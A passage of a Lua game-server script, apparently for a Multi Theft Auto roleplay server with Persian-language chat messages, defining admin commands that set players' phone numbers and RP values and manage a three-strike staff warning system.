				outputChatBox("#c4ff00[GhoreKeshi]: #ffffffBarande In Ghore Keshi Kasi Nist Joz #c4ff00"..getPlayerName(Random).."("..getElementData(Random,"TarafID")..")#ffffff! Mobarakesh Bashe :)", getRootElement(), 255, 255, 255, true)
			end, 5000, 1 )
		end, 35000, 1 )
	else
		outputChatBox("#ff0000[Error]: #ffffffEbteda Login Konid!", thePlayer, 212, 156, 49,true)
	end
end)





addCommandHandler("setnumber",
function(thePlayer, command, player, number)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 11 then
		outputChatBox("#ff0000✖️ #ffffffShoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local find = miscSys:findPlayer ( player )
	local number = tonumber(number)
	local targetPlayer = getPlayerName ( find )
	if player then
	if find then
	if number then
		setElementData(accSys:getPlayerAcc(find), "pPnumber", number)
		outputChatBox("#00ff00☑️ #ffffffShoma Shomare #00ff00"..targetPlayer.." #ffffffRa Be #00ff00"..number.." #ffffffSet Kardid!", thePlayer, 255, 255, 255, true)
	else
		outputChatBox("#ff0000✖️ #ffffffShomare Nemitavanad Khali Bashad!", thePlayer, 255, 255, 255, true)
	end
	else
		outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
	end
	else
		outputChatBox("#C0C0C0Bezan: /setnumber  [PartOfName/ID]  [number]", thePlayer, 255, 255, 255, true)
	end
end)


addCommandHandler("setrp",
function(thePlayer, command, player, tedad)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 8 then
		outputChatBox("#ff0000✖️ #ffffffShoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local find = miscSys:findPlayer ( player )
	local tedad = tonumber(tedad)
	local targetPlayer = getPlayerName ( find )
	if player then
	if find then
	if tedad then
		setElementData(accSys:getPlayerAcc(find), "pRob", tedad)
		outputChatBox("#00ff00☑️ #ffffffShoma Rp #00ff00"..targetPlayer.." #ffffffRa Be #00ff00"..tedad.." #ffffffSet Kardid!", thePlayer, 255, 255, 255, true)
	else
		outputChatBox("#ff0000✖️ #ffffffShomare Nemitavanad Khali Bashad!", thePlayer, 255, 255, 255, true)
	end
	else
		outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
	end
	else
		outputChatBox("#C0C0C0Bezan: /setrp [PartOfName/ID]  [tedad]", thePlayer, 255, 255, 255, true)
	end
end)

addCommandHandler("av",
function(thePlayer, command, player, meghdar)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 9 then
		outputChatBox("#ff0000✖️ #ffffffShoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	if player then
		local find = miscSys:findPlayer ( player )
		if find then
			
			if tonumber(getElementData(accSys:getPlayerAcc(find), "pAdmin")) == 0 then
				outputChatBox("#FF0000 In Player Ozv Staff Nist", thePlayer, 255, 255, 255,true)
			else
				if tonumber(getElementData(accSys:getPlayerAcc(find), "pAv")) == 0 then
					setElementData(accSys:getPlayerAcc(find), "pAv", 1)
					outputChatBox("#FF0000Shoma [1/3 AV] Gereftid Dar Soorati Ke [3/3 AV] Begirid Az Staff Be Modat Du Mah Mahrom Mishavid", find, 255, 255, 255,true)
					outputChatBox("#FF0000Shoma Be Player #66CC00"..getPlayerName(find).."#FF0000 [1/3 AV] Dadid", thePlayer, 255, 255, 255,true) 
				elseif tonumber(getElementData(accSys:getPlayerAcc(find), "pAv")) == 1 then
					setElementData(accSys:getPlayerAcc(find), "pAv", 2)
					outputChatBox("#FF0000Shoma [2/3 AV] Gereftid Dar Soorati Ke [3/3 AV] Begirid Az Estaf Be Modat Do Mah Mahrom Mishavid!Movazeb Bashhhhh!!!!!!", find, 255, 255, 255,true)
					outputChatBox("#FF0000Shoma Be Player #66CC00"..getPlayerName(find).."#FF0000 [2/3 AV] Dadid", thePlayer, 255, 255, 255,true) 
				elseif tonumber(getElementData(accSys:getPlayerAcc(find), "pAv")) == 2 then
					setElementData(accSys:getPlayerAcc(find), "pAv", 0)
					setElementData(accSys:getPlayerAcc(find), "pAdmin", 0)
					outputChatBox("#FF0000Shoma [3/3 AV] Gereftid Va Az Staff Be Modat 2Mah Mahrom Shodid!motasefam", find, 255, 255, 255,true)
					outputChatBox("#FF0000Shoma Player #66CC00"..getPlayerName(find).."#FF0000 Ra Az Estaf Kick Kardid", thePlayer, 255, 255, 255,true) 
				end
			end
		else
			outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
		end
	else
		outputChatBox("#C0C0C0Bezan: /av  [PartOfName/ID]", thePlayer, 255, 255, 255, true)
	end
end)

addCommandHandler("takeav",
function(thePlayer, command, player, meghdar)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 9 then
		outputChatBox("#ff0000✖️ #ffffffShoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local find = miscSys:findPlayer ( player )
	local meghdar = tonumber(meghdar)
	local targetPlayer = getPlayerName ( find )
	if player then
	if find then
		if tonumber(getElementData(accSys:getPlayerAcc(find), "pAdmin")) == 0 then
			outputChatBox("#FF0000 In Player Ozv Staff Nist", player, 255, 255, 255,true)
		else
			if tonumber(getElementData(accSys:getPlayerAcc(find), "pAv")) == 2 then
				setElementData(accSys:getPlayerAcc(find), "pAv", 1)
				outputChatBox("#66CC00Shoma [1/3 AV] Darid Admin "..getPlayerName(thePlayer).." Az Shoma 1AV Kam Kard ", find, 255, 255, 255,true)
				outputChatBox("#FF0000Shoma Az Player #66CC00"..getPlayerName(find).."#FF0000 [1/3 AV] Kam Kardid", thePlayer, 255, 255, 255,true) 
			elseif tonumber(getElementData(accSys:getPlayerAcc(find), "pAv")) == 1 then
				setElementData(accSys:getPlayerAcc(find), "pAv", 0)
				outputChatBox("#66CC00Shoma [0/3 AV] Darid Admin "..getPlayerName(thePlayer).." Az Shoma 1AV Kam Kard ", find, 255, 255, 255,true)
				outputChatBox("#FF0000Shoma Az Player #66CC00"..getPlayerName(find).."#FF0000 [0/3 AV] Kam Kardid", thePlayer, 255, 255, 255,true) 
			elseif tonumber(getElementData(accSys:getPlayerAcc(find), "pAv")) == 0 then
				outputChatBox("#FF0000In Player Av Nadarad", thePlayer, 255, 255, 255,true) 
			end
		end
	else
		outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
	end
	else
		outputChatBox("#C0C0C0Bezan: /setmat  [PartOfName/ID]", thePlayer, 255, 255, 255, true)
	end
end)


adminrank={
	[1] = "Terial Admin",
	[2] = "Admin Rank 1",
	[3] = "Admin Rank 2",
	[4] = "Admin Rank 3",
	[5] = "Admin Rank 4",
	[11] = "Founder",
}
addCommandHandler("showav",
function(thePlayer, command, player, meghdar)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1 then
		outputChatBox("#ff0000✖️ #ffffffShoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local find = miscSys:findPlayer ( player )
	local meghdar = tonumber(meghdar)
	local targetPlayer = getPlayerName ( find )
	if player then
		if find then
			if tonumber(getElementData(accSys:getPlayerAcc(find), "pAdmin")) == 0 then
				outputChatBox("#FF0000 In Player Ozv Staff Nist", thePlayer, 255, 255, 255,true)
			else
				outputChatBox("#FF0000 In Player: #FFFFFF"..tonumber(getElementData(accSys:getPlayerAcc(find), "pAv")).." #FF0000Av Dar Rank #FFFFFF"..adminrank[tonumber(getElementData(accSys:getPlayerAcc(find), "pAdmin"))].." #FF0000Darad", thePlayer, 255, 255, 255,true)
			end

		else
			outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
		end
	else
		outputChatBox("#C0C0C0Bezan: /setmat  [PartOfName/ID]", thePlayer, 255, 255, 255, true)
	end
end)


